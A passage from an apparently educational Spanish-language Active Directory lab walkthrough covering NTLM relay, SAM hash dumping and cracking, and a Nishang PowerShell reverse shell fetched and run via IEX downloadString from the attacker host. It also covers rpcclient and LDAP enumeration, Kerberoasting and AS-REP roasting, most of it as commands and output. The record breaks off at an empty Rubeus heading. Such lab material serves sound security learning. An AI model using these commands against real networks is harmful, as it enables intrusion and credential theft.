Ahora lanzamos la herramienta ```ntlmrelayx.py```, la cual pertence a la colección Impacket y realiza ataques de retransmisión NTLM, creando un servidor SMB y HTTP, retransmitiendo credenciales a varios protocolos diferentes (SMB, HTTP, LDAP, etc.). Para esta situación le daremos soporte para SMBv2 debido a que estamos frente a equipos con Windows 10. 

```bash
┌──(root㉿kali)-[/AD]
└─ ./ntlmrelayx.py -tf targets.txt -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Setting up WCF Server
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Connection from FELIPECORP/FCANALES@10.1.1.32 controlled, attacking target smb://10.1.1.33
[*] Authenticating against smb://10.1.1.33 as FELIPECORP/FCANALES SUCCEED
[*] SMBD-Thread-134: Connection from FELIPECORP/ADMINISTRADOR@10.1.1.35 controlled, attacking target smb://10.1.1.33
[*] Authenticating against smb://10.1.1.33 as FELIPECORP/ADMINISTRADOR SUCCEED
[*] SMBD-Thread-134: Connection from FELIPECORP/ADMINISTRADOR@10.1.1.35 controlled, but there are no more targets left!
[*] Target system bootKey: 0x6ffbb2819194977bc72ce267fd00678a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[*] SMBD-Thread-136: Connection from FELIPECORP/ADMINISTRADOR@10.1.1.35 controlled, but there are no more targets left!
[*] SMBD-Thread-137: Connection from FELIPECORP/ADMINISTRADOR@10.1.1.35 controlled, but there are no more targets left!
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] SMBD-Thread-138: Connection from FELIPECORP/ADMINISTRADOR@10.1.1.35 controlled, but there are no more targets left!
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4910866e63e3c3eb380a12acd96e7c26:::
[*] SMBD-Thread-139: Connection from FELIPECORP/ADMINISTRADOR@10.1.1.35 controlled, but there are no more targets left!
User2:1003:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
[*] Done dumping SAM hashes for host: 10.1.1.33
```

Podremos ahora obtener la contraseña del usuario "User2", guardando el o los hashes obtenido:

```bash
┌──(root㉿kali)-[/AD/nishang/Shells]
└─ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt sam       
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status   
Password2        (User2)     
2g 0:00:00:02 DONE (2022-08-28 00:33) 0.8474g/s 6077Kp/s 6077Kc/s 6102KC/s  _ 09..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```


## Reverse shell por ntlmrelayx

Desde nishang ocuparemos el siguiente script, el cual lo modificaremos:

```bash
┌──(root㉿kali)-[/AD/nishang/Shells]
└─ nano Invoke-PowerShellTcp.ps1
```

Al final del ```Invoke-PowerShellTcp.ps1``` escribimos lo siguiente:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.19 -Port 4646
```

> Extraído del github oficial de [Nishang](https://github.com/samratashok/nishang)


Una vez realizado el proceso, nos compartimos un servidor HTTP con python para enviarnos al equipo víctima el ```Invoke-PowerShellTcp.ps1```:

```bash
┌──(root㉿kali)-[/AD/nishang/Shells]
└─ python -m http.server            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [24/May/2022 21:40:21] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [24/May/2022 21:40:23] code 404, message File not found
127.0.0.1 - - [24/May/2022 21:40:23] "GET /favicon.ico HTTP/1.1" 404 -
```

Nos ponemos a la escucha por el puerto 4646:

```bash
┌──(root㉿kali)-[/AD]
└─ rlwrap nc -nlvp 4646  
listening on [any] 4646 ...

```

Se ejecuta el ```responder.py```:

```bash
┌──(root㉿kali)-[/AD]
└─ python2 Responder.py -I eth0 -rdw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.1.1.19]
    Challenge set              [1122334455667788]



[+] Listening for events...
```

Y configuramos el ```ntlmrelayx.py``` para que nos interprete el código malicioso anteriormente configurado:

```bash
┌──(root㉿kali)-[/AD]
└─ ./ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.1.1.19:8000/Invoke-PowerShellTcp.ps1')"
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 10.1.1.32, attacking target smb://10.1.1.33
[*] HTTPD: Received connection from 10.1.1.32, attacking target smb://10.1.1.33
[*] Authenticating against smb://10.1.1.33 as FELIPECORP\fcanales SUCCEED
[*] Authenticating against smb://10.1.1.33 as FELIPECORP\fcanales SUCCEED
[*] Authenticating against smb://10.1.1.33 as FELIPECORP\fcanales SUCCEED
[*] Authenticating against smb://10.1.1.33 as FELIPECORP\fcanales SUCCEED
[*] Authenticating against smb://10.1.1.33 as FELIPECORP\fcanales SUCCEED
[*] Executed specified command on host: 10.1.1.33
[*] Executed specified command on host: 10.1.1.33
[*] Executed specified command on host: 10.1.1.33
[*] Executed specified command on host: 10.1.1.33
```

Y tras esperar la autenticación sobre nosotros se inyecta el comando a nivel de sistema:

```bash
┌──(root㉿kali)-[/AD]
└─ rlwrap nc -nlvp 4646  
listening on [any] 4646 ...
Windows PowerShell running as user PC-User2$ on PC-User2
Copyright (C) 2015 Microsoft Corporation. All rights reserved

whoami
nt authority\system
PS C:\Windows\System32> ipconfig

Configuraci?n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec?fico para la conexi?n. . : 
   Direcci?n IPv6 . . . . . . . . . . : fd17:625c:f037:2:94eb:793:6a4:f51e
   Direcci?n IPv6 temporal. . . . . . : fd17:625c:f037:2:8c73:57c2:3d23:7388
   V?nculo: direcci?n IPv6 local. . . : fe80::94eb:793:6a4:f51e%4
   Direcci?n IPv4. . . . . . . . . . . . . . : 10.1.1.33
   M?scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%4
                                       10.1.1.1
PS C:\Windows\System32> 
```

## rpcclient

Otra forma de obtener información es teniendo credenciales válidas, y ocupando rpcclient podremos obtener usuarios, descripciones, grupos, datos de modificaciones, entre otras cosas.

```bash
┌──(root㉿kali)-[/AD]
└─ rpcclient -U "felipecorp.local\administrador%P@\$\$w0rd\!" 10.1.1.35 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'     
Administrador
Invitado
krbtgt
DefaultAccount
fcanales
user2
test
```

```bash
┌──(root㉿kali)-[/AD]
└─ rpcclient -U "felipecorp.local\administrador%P@\$\$w0rd\!" 10.1.1.35 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
0x1f4
0x1f5
0x1f6
0x1f7
0x44f
0x450
0x458
```

En la descripción podemos encontrar información sensible como pistas o incluso contraseñas como el caso del usuario "test":

```bash
┌──(root㉿kali)-[/AD]
└─ for rid in $(rpcclient -U "felipecorp.local\administrador%"P@\$\$w0rd\!"" 10.1.1.35 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[*] Para el RID $rid:\n"; rpcclient -U "felipecorp.local\administrador%"P@\$\$w0rd\!"" 10.1.1.35 -c "queryuser $rid" | grep -E -i "user name|description";done

[*] Para el RID 0x1f4:

	User Name   :	Administrador
	Description :	Cuenta integrada para la administración del equipo o dominio

[*] Para el RID 0x1f5:

	User Name   :	Invitado
	Description :	Cuenta integrada para el acceso como invitado al equipo o dominio

[*] Para el RID 0x1f6:

	User Name   :	krbtgt
	Description :	Cuenta de servicio de centro de distribución de claves

[*] Para el RID 0x1f7:

	User Name   :	DefaultAccount
	Description :	Cuenta de usuario administrada por el sistema.

[*] Para el RID 0x44f:

	User Name   :	fcanales
	Description :	

[*] Para el RID 0x450:

	User Name   :	user2
	Description :	

[*] Para el RID 0x458:

	User Name   :	test
	Description :	Password temporal: Password3

```

Otra información que podemos revisar es la siguiente:

```bash
┌──(root㉿kali)-[/AD]
└─ rpcclient -U "felipecorp.local\administrador%"P@\$\$w0rd\!"" 10.1.1.35
rpcclient $> enumdomgroups
group:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
group:[Admins. del dominio] rid:[0x200]
group:[Usuarios del dominio] rid:[0x201]
group:[Invitados del dominio] rid:[0x202]
group:[Equipos del dominio] rid:[0x203]
group:[Controladores de dominio] rid:[0x204]
group:[Administradores de esquema] rid:[0x206]
group:[Administradores de empresas] rid:[0x207]
group:[Propietarios del creador de directivas de grupo] rid:[0x208]
group:[Controladores de dominio de sólo lectura] rid:[0x209]
group:[Controladores de dominio clonables] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Administradores clave] rid:[0x20e]
group:[Administradores clave de la organización] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
	rid:[0x458] attr:[0x7]
	rid:[0x45a] attr:[0x7]
rpcclient $> queryuser 0x458
	User Name   :	test
	Full Name   :	test
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Password temporal: Password3
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Sun, 28 Aug 2022 02:56:25 EDT
	Password can change Time :	Mon, 29 Aug 2022 02:56:25 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x458
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

## ldapdomaindump

Otra forma de obtener información de usuarios de manera ordenada es con ```ldapdomaindump.py```, pues este generará archivos en formato HTML:

```bash
┌──(root㉿kali)-[/AD]
└─ python3 ldapdomaindump.py -u 'felipecorp.local\administrador' -p 'P@$$w0rd!' 10.1.1.35
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Nos habilitamos apache y un servidor web con python dentro de la carpeta en que ejecutamos ```ldapdomaindump.py```:

```bash
┌──(root㉿kali)-[/AD]
└─ service apache2 start
```

```bash
┌──(root㉿kali)-[/AD]
└─ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [28/Aug/2022 04:08:03] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [28/Aug/2022 04:08:04] code 404, message File not found
127.0.0.1 - - [28/Aug/2022 04:08:04] "GET /favicon.ico HTTP/1.1" 404 -
```

Y podremos ver la información desde nuestro navegador:

![ldapdomainchrome](/images/ldapdomainchrome.png)

Luego al seleccionar alguno de los archivos creados, lo veremos de la siguiente manera, por ejemplo los usuarios:

![ldapdomainusers](/images/ldapdomainusers.png)

Otro ejemplo con los grupos:

![ldapdomaingroups](/images/ldapdomainbygroup.png)

Y asi sucesivamente podemos ir analizando uno a uno para obtener información del objetivo.

### evil-winrm

Si identificamos un usuario nuevo con el puerto 5985 abierto, nos podemos conectar por medio de ```evil-winrm```:

```bash
┌──(root㉿kali)-[/AD]
└─ evil-winrm -u 'SVC_SQLservice' -p 'Password4' -i 10.1.1.35

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_sqlservice\Documents> whoami
felipecorp\svc_sqlservice

```

## Kerberoasting attack

Este tipo de ataque se puede realizar solo si tenemos credenciales válidas dentro del dominio. La idea es hacernos pasar por una cuenta de usuario con un nombre principal de servicio (SPN) con el fin de solicitar un ticket que contiene una contraseña cifrada. Para comprobar si hay usuarios vulnerables, realizamos lo siguiente:

```bash
┌──(root㉿kali)-[/AD]
└─ GetUserSPNs.py felipecorp.local/fcanales:Password1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                        Name            MemberOf                                                                            PasswordLastSet             LastLogon  Delegation 
------------------------------------------  --------------  ----------------------------------------------------------------------------------  --------------------------  ---------  ----------
felipecorp.local/SVC_SQLservice.DC-Company  svc_sqlservice  CN=Propietarios del creador de directivas de grupo,CN=Users,DC=felipecorp,DC=local  2022-08-28 03:32:18.615444  <never>               
```

Una vez obtenemos un usuario, con el parámetro ```-request``` obtendremos el hash tgs:

```bash
┌──(root㉿kali)-[/AD]
└─ GetUserSPNs.py felipecorp.local/fcanales:Password1 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                        Name            MemberOf                                                                            PasswordLastSet             LastLogon  Delegation 
------------------------------------------  --------------  ----------------------------------------------------------------------------------  --------------------------  ---------  ----------
felipecorp.local/SVC_SQLservice.DC-Company  svc_sqlservice  CN=Propietarios del creador de directivas de grupo,CN=Users,DC=felipecorp,DC=local  2022-08-28 03:32:18.615444  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_sqlservice$FELIPECORP.LOCAL$felipecorp.local/svc_sqlservice*$db2759ca8c170eb791f37c3c3b794299$3bd0f0e2f749779ca7af88a9c6f836a7fcecf79ad8ef28c25f3e38687d883fcfe51ac21eac55e1c205612cb922e7f3392e9d962e132ff4e4842ca4cc947ce436326167af874b17d507e5f43110ceeaaf817cf7935f2a555f49b0965e979bd44566567fedaabb36682813a32f52e330ec7dfc622dea66820c5114288745337eef7a95a1b72809c7b86e282747756527a15b322d218e4e4cc86692d0c3032c7a9cf134170613df2d9eab88a54d3925b192bab5bc7d7d621a11464a2ceb8f15efce31949817c16e7c97be3503e63bfbbbe4fe509205e2faa982ef2edbfe8a8368a28f99d801a7a03c5717a64723fa443e38040a739a42e1b2fd083854d51283ce0a83526bbd6dcf38d72ca71bd1f609f5fcee366713d937be06d4a50b23f76add0d91543f2cda8606bc085c89f06f9185a494e805c2c3b12afae2ee7c1509d8c720ed9b9246887b8ae6da7a574de3a1410eb17ea87fd8f04dac282c21858232c538e78fc5ea44aed75dcba6eb8b2f5eb96b79d93eba215e5b1c28719c83c553e5d2634f430876745833f7fce6eb3cfb65c90baa65342e2c45843b6bc88f2e2954ddda9241c921f744b54818edb737fa88ec7223d2c6e28d7bd6d4ca6df56e4c17769df6ed77b9e0c6778ff23ebe74b370445f199ceb35148dc7e46c8e3e41f45246c6ebc0a9d8aa0264c31e1db57b67e912631cbef4b899b7f2e94294429ba2ff6a77450f0ece38a6021443de8de4e66685b08066f84f07e51caf95463946ed75e18d73f87d47e907c86864db5a6426a3fe81eb109c90773ce622431309aa9fa6c864a8ce62b5001b15d5a387f6837906b3006bcf6d2917517d7c3d3e7fc87a5bdb5eef317b829ea3cb02a874d2b5e7117d67cf539165244278a3ffcfafe7d611ccb5a17ee0428d649074c0c376fc2e299657bbb2fed6460abd83d59bd7beabb80fc54f81930867543a6eccfe767dd5b332b4cffc1f8417e03f43bfb87b67754f74a4e3c9fa8a5a0c20e4473aa2cae128eeba24679f176ccb0da4e19364aa8d4264ea687f97414fff3635460339f4db226f16f7be6e4e988a91b68bf234f0a77e28e1df431dd6e22a2738289f1c78115c28b957e1c71c3473ec66b9f757a35a67e608e59ffd5c9d112a322fabdc5fd042f396861b2f296ff8e27953317aea5ba893103d8614dc2630091e4e16c6a92262915f0d9d26623b22c4dc373e5a2e96a337821fcd0298566e5228965dd265d36fc1f28bf75638417aeaae6a9861592c63d9ad366fe4bcbc25996a2e876a2014f4036443f3b8b26f6c88232acb1cfc6ad50b2df3db2262514db32b090d29de952a4342331d3231d8a947ab376b9022f5185cde7f56fa3d5cfe30728fb8632c8ff1931f
```

Nos copiamos el hash para proceder a crackearlo con ```john the ripper```:

```bash
┌──(root㉿kali)-[/AD]
└─ cat hashk
$krb5tgs$23$*svc_sqlservice$FELIPECORP.LOCAL$felipecorp.local/svc_sqlservice*$db2759ca8c170eb791f37c3c3b794299$3bd0f0e2f749779ca7af88a9c6f836a7fcecf79ad8ef28c25f3e38687d883fcfe51ac21eac55e1c205612cb922e7f3392e9d962e132ff4e4842ca4cc947ce436326167af874b17d507e5f43110ceeaaf817cf7935f2a555f49b0965e979bd44566567fedaabb36682813a32f52e330ec7dfc622dea66820c5114288745337eef7a95a1b72809c7b86e282747756527a15b322d218e4e4cc86692d0c3032c7a9cf134170613df2d9eab88a54d3925b192bab5bc7d7d621a11464a2ceb8f15efce31949817c16e7c97be3503e63bfbbbe4fe509205e2faa982ef2edbfe8a8368a28f99d801a7a03c5717a64723fa443e38040a739a42e1b2fd083854d51283ce0a83526bbd6dcf38d72ca71bd1f609f5fcee366713d937be06d4a50b23f76add0d91543f2cda8606bc085c89f06f9185a494e805c2c3b12afae2ee7c1509d8c720ed9b9246887b8ae6da7a574de3a1410eb17ea87fd8f04dac282c21858232c538e78fc5ea44aed75dcba6eb8b2f5eb96b79d93eba215e5b1c28719c83c553e5d2634f430876745833f7fce6eb3cfb65c90baa65342e2c45843b6bc88f2e2954ddda9241c921f744b54818edb737fa88ec7223d2c6e28d7bd6d4ca6df56e4c17769df6ed77b9e0c6778ff23ebe74b370445f199ceb35148dc7e46c8e3e41f45246c6ebc0a9d8aa0264c31e1db57b67e912631cbef4b899b7f2e94294429ba2ff6a77450f0ece38a6021443de8de4e66685b08066f84f07e51caf95463946ed75e18d73f87d47e907c86864db5a6426a3fe81eb109c90773ce622431309aa9fa6c864a8ce62b5001b15d5a387f6837906b3006bcf6d2917517d7c3d3e7fc87a5bdb5eef317b829ea3cb02a874d2b5e7117d67cf539165244278a3ffcfafe7d611ccb5a17ee0428d649074c0c376fc2e299657bbb2fed6460abd83d59bd7beabb80fc54f81930867543a6eccfe767dd5b332b4cffc1f8417e03f43bfb87b67754f74a4e3c9fa8a5a0c20e4473aa2cae128eeba24679f176ccb0da4e19364aa8d4264ea687f97414fff3635460339f4db226f16f7be6e4e988a91b68bf234f0a77e28e1df431dd6e22a2738289f1c78115c28b957e1c71c3473ec66b9f757a35a67e608e59ffd5c9d112a322fabdc5fd042f396861b2f296ff8e27953317aea5ba893103d8614dc2630091e4e16c6a92262915f0d9d26623b22c4dc373e5a2e96a337821fcd0298566e5228965dd265d36fc1f28bf75638417aeaae6a9861592c63d9ad366fe4bcbc25996a2e876a2014f4036443f3b8b26f6c88232acb1cfc6ad50b2df3db2262514db32b090d29de952a4342331d3231d8a947ab376b9022f5185cde7f56fa3d5cfe30728fb8632c8ff1931f
```

```bash
┌──(root㉿kali)-[/AD]
└─ john --wordlist=/usr/share/wordlists/rockyou.txt hashk 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password4        (?)     
1g 0:00:00:00 DONE (2022-08-28 04:35) 1.818g/s 346298p/s 346298c/s 346298C/s Saints1..55995599
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Validamos si es un administrador del dominio con ```crackmapexec```:

```bash
┌──(root㉿kali)-[/AD]
└─ crackmapexec smb 10.1.1.0/24 -u 'SVC_SQLservice' -p 'Password4'
SMB         10.1.1.35       445    DC-COMPANY       [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:DC-COMPANY) (domain:felipecorp.local) (signing:True) (SMBv1:True)
SMB         10.1.1.32       445    PC-FELIPE        [*] Windows 10.0 Build 19041 x64 (name:PC-FELIPE) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.33       445    PC-USER2         [*] Windows 10.0 Build 19041 x64 (name:PC-USER2) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.32       445    PC-FELIPE        [+] felipecorp.local\SVC_SQLservice:Password4 (Pwn3d!)
SMB         10.1.1.35       445    DC-COMPANY       [+] felipecorp.local\SVC_SQLservice:Password4 (Pwn3d!)
SMB         10.1.1.33       445    PC-USER2         [+] felipecorp.local\SVC_SQLservice:Password4 (Pwn3d!)
SMB         10.1.1.19       445    KALI             [+] \SVC_SQLservice:Password4

```

### Rubeus (kerberoasting attack)

Nos subimos el Rubeus.exe por medio de un servidor previamente definido con python y lo ejecutamos para obtener el hash tgs siguiendo los siguiente pasos:

```bash
C:\Windows\Temp\test> certutil.exe -f -urlcache -split http://10.1.1.19/Rubeus.exe Rubeus.exe
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  000000  ...
  06bc00
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\test> Rubeus.exe kerberoast /creduser:felipecorp.local\fcanales /credpassword:Password1

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : felipecorp.local
[*] Searching path 'LDAP://DC-Company.felipecorp.local/DC=felipecorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_sqlservice
[*] DistinguishedName      : CN=SVC_SQLservice,CN=Users,DC=felipecorp,DC=local
[*] ServicePrincipalName   : felipecorp.local/SVC_SQLservice.DC-Company
[*] PwdLastSet             : 28/08/2022 9:32:18
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sqlservice$felipecorp.local$felipecorp.local/SVC_SQLservice.DC-
                             Company@felipecorp.local*$43E2B5A7D075FAFDFC5D55AF7289BB80$BD9EB1277A7611949BE55
                             05826431FE71321F95DCB6E571471113FF36703F4BD57E5D47C83A8033B085BE723CE8604DD67933
                             0BED500412C16514026FB422DB6019C6A1CEB879767EEFA8B7A47E1BF88688F4058419C3CEF2A5FC
                             1F7DF523DB512FEC822A5355859CF77C1FFDB67E124334829CFD43C3856A3F1A8DCC73F65693207D
                             F2D5A1CF4E38FBD5B5BD32F5DBE5A60D18FCC47B843BFDA3A161B9A5CAACA110EFCC11EA07BE5A79
                             0C183B2B72EAEA3C64593E3E2F5481641387B874D02D7AF5F5E4DADA3129469D612CA3D8A8B5F0F7
                             074D73C1CBE31DD5469CB840DDDE5B4A687413788891F0F0422CB5D7030E0DDC3C78A8CC1C3353E9
                             0C6524A81D513686624D9C24606C2AEB4E6D6FDA261213C0228B79B8E4011984CF14847BD99C14C2
                             E29F422CE64395F588A65D6C2620AD0940DE08AC683BDCE19643AA3BC1808622F830C4824E80B983
                             9D8AAA17BE00FF49F2F1B9D76CF45714D41408B99AE22C685AFACE2A9BB274F4E07BC7FEE93DFB41
                             9BBC4101E209E01C5B2F637F01F57B36B4DF5B730D8B8724327C62E735ADCDF62AE3915740A9A604
                             FD0A1CA51ED56EFB06AFAEC81D54A3EB561150474E9A15E667B702C0A768C3421F742D43FB90D097
                             96215D9A7E2A94007D752AA79BC2BEEBFE6E8B98C7C5FA284D0A915E01166186D7D45F49D80B13E1
                             5DA63BCADDBFF1692167F9CC6E21557B7DAE60C5351CC7BAB8326B96756A5D03797218BE6CFDE4CE
                             DDFF8056D09EB92ACC903667554AB7BE8EB53D8BF8FAAE8C103EF99175A63995A12B58D5AB067A4C
                             7FD73B0078F88131C09D290A44E673E7772267CCD51C0F0BAD4F2304C4757EBB4C3E99B6057CEF19
                             EF3FA9849C8C36179BC3B87CD125CEBDC475307D63DAE1FD006EABD0B8BF48389BEAA9E0F015A8D6
                             69943EC31C6C9211EA503DB9BC1828A4FD0358B7B5AA16939F26A3575CBC9B1BE68C30B7137732D3
                             B4FC6B37A34929C195C3D99FF67DAF036D87E478ABE21F38A0C0E73CD049ACF841595CE15FF63EE4
                             7BB613357187A66A6873D28DECF3BAE71B49A6ED2012C3FE4190351D3C75161D3EC8AA7F5856F30D
                             4C3999861CBC4CFC7176128A36283CC050050B93EEB5EF750C4E14E3218B7366FED2774E2F293655
                             88AF74FC0098707EBEF647F10F747E6C80DD7511F7F977783A6F79E00AA83A94B054E54EF9F34809
                             A075721C9F47FA615B99680624B047071B2CF8CC7BBA13509E2628B45176BF160951AA8657D1E1D8
                             16333A0C01FD5E8C5C1DD271E1C61D7E1EFF60350C62E3A101FF0CD23C6BE34B72C620C48D62FBD4
                             80F005BF490FFBC8DCB560B45C44A8F7AA0F2E90C8E3C7BBBF87FB548CEA0C3273423F5006DEF4B6
                             9D348FD9348AA147DB1B201027B261BC89C93928DD5889E146C8C7CEB7E35629D34C02B9BD1AF9A2
                             EAD5B862A4682C351D072C77821470C6F70C958E9B5FC4F5AEAA5CB9AA14DE88323A8AFCBD4854D2
                             E47D2255B
```

Y así es otra forma de obtener el hash.

## Asreproasting Attack

Ahora ¿qué pasa si tenemos los usuarios pero no las contraseñas?

```bash
┌──(root㉿kali)-[/AD]
└─ cat users.txt   
Administrador
Invitado
krbtgt
DefaultAccount
fcanales
user2
test
svc_sqlservice
```

Y esta vez ocuparemos ```GetNPUsers.py``` para realizar el siguiente proceso para obtener un hash y luego poder crackearlo:

```bash
┌──(root㉿kali)-[/AD]
└─ python3 /usr/local/bin/GetNPUsers.py felipecorp.local/ -no-pass -usersfile users.txt
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User fcanales doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User user2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User test doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sqlservice@FELIPECORP.LOCAL:7c5f4e31f50f1bb2b4b4dbd135fa61a9$9a37a68a6735177a974e44077a28089c983994c65a268e02b743f33fd50b0e81821dbb7ee49728c75aef5fee70a15b5959795f6bcd19c09ef3539ae37655761adf0e2d0713df000f586dcb8d94cb1aad177a5434605f6a60542fce15cef132a7ea94332e910eb8ef8158dbd7c596643e1f2d603e1a724aebc3ccae02f14c688edefed87e64884a6e49f0a35de6db6403e9154718cda161d3ec47861d08004d577ba035cc48875e6c6799d58369c683ba67840da1eb050722894ecc611b904c6e68b2b4007c6e3c2c00c84a96d4def3c409ec039925b66704f15c765bf8a502e7297e96c73d0a95d1abb1cf27d5b05416d09312f5
```

### Rubeus (Asreproasting Attack)

